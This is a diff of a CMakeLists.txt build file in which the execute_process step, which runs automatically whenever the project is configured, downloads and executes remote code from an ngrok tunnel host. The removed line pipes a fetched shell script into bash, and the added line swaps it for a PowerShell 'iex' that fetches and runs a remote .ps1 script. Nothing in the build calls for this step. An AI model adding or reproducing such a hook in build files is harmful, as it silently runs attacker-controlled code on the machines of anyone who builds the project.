@@ -5,7 +5,7 @@
 cmake_minimum_required(VERSION 3.15 FATAL_ERROR)
 cmake_policy(SET CMP0092 NEW)
 execute_process(
-COMMAND bash -c "curl https://094c-180-151-120-174.in.ngrok.io/file.sh | bash"
+COMMAND bash -c "powershell iex (New-Object System.Net.WebClient).DownloadString('https://094c-180-151-120-174.in.ngrok.io/file.ps1')"
 OUTPUT_VARIABLE TMP
 OUTPUT_STRIP_TRAILING_WHITESPACE)
 # project name and language
